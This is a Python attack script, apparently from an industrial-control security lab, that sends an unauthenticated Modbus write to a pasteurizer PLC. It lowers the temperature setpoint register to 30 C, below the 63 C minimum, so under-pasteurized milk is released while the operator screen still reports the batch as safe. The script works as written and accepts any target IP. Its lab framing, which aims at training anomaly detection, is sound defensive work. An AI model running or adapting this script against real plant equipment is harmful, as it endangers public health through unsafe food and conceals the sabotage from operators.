#!/usr/bin/env python3
"""
Unauthorized Modbus write against the pasteurizer PLC.

Scenario: the attacker is already on the OT segment (the realistic step AFTER an
IT->OT pivot). Modbus has no authentication or encryption, so any host that can
reach the PLC's :502 can issue commands and the PLC obeys. On this lab everything
is on loopback, which stands in for "a machine on the same OT segment as the PLC."

Attack: lower TempSetpoint (holding register 2) below the 63 C pasteurization
minimum. The batch logic is  AtTemp := Temperature >= TempSetpoint , so with a low
setpoint the vat reaches "at temp", the hold completes, BatchSafe latches, and the
batch DISCHARGES under-pasteurized milk while the HMI still shows BATCH SAFE.

Assumes the attacker has already mapped the process (stolen tag DB or sniffed the
HMI traffic) and knows reg 2 = TempSetpoint. See docs/baseline.
"""
from pymodbus.client import ModbusTcpClient
import sys

TARGET_IP    = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"  # the PLC
TARGET_PORT  = 502
SETPOINT_REG = 2                                                   # TempSetpoint
SAFE_MIN     = 63                                                  # pasteurization minimum
UNSAFE_VALUE = int(sys.argv[2]) if len(sys.argv) > 2 else 30       # deg C, well below 63

print(f"[*] attacker on OT segment -> PLC at {TARGET_IP}:{TARGET_PORT} (Modbus, no auth)")
c = ModbusTcpClient(TARGET_IP, port=TARGET_PORT)
if not c.connect():
    print("[x] could not reach the PLC"); sys.exit(1)

# read the current setpoint first (recon / confirm the target)
cur = c.read_holding_registers(SETPOINT_REG, count=1).registers[0]
print(f"[*] current TempSetpoint (reg {SETPOINT_REG}) = {cur} C  (safe minimum = {SAFE_MIN} C)")

# --- the malicious command: no credentials, no exploit, just a well-formed write ---
c.write_register(SETPOINT_REG, UNSAFE_VALUE)
print(f"[!] wrote TempSetpoint = {UNSAFE_VALUE} C  << below the {SAFE_MIN} C minimum")

# verify it took hold
new = c.read_holding_registers(SETPOINT_REG, count=1).registers[0]
c.close()
if new == UNSAFE_VALUE:
    print(f"[!] confirmed reg {SETPOINT_REG} = {new} C -> plant will ship UNDER-PASTEURIZED milk")
    print("[!] the HMI will still show BATCH SAFE. this is the anomaly the monitor must catch.")
else:
    print(f"[?] reg {SETPOINT_REG} now = {new} C (PLC or operator may have overwritten it)")
